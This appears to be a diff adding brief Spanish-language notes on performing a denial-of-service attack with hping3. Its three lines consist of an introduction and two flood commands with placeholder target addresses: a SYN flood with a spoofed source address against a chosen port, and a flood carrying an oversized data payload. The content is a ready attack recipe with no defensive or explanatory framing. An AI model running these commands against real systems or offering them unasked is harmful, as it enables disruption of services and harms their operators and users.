@@ -1,0 +1,3 @@
+Para hacer una DoS vamos a utilizar hping:
+> hping3 -S <Target IP Address> -a <Spoofable IP Address> -p <Port Objective> --flood 
+> hping3 -d 65538 -S -p <Port Objective> --flood <Target IP Address> 
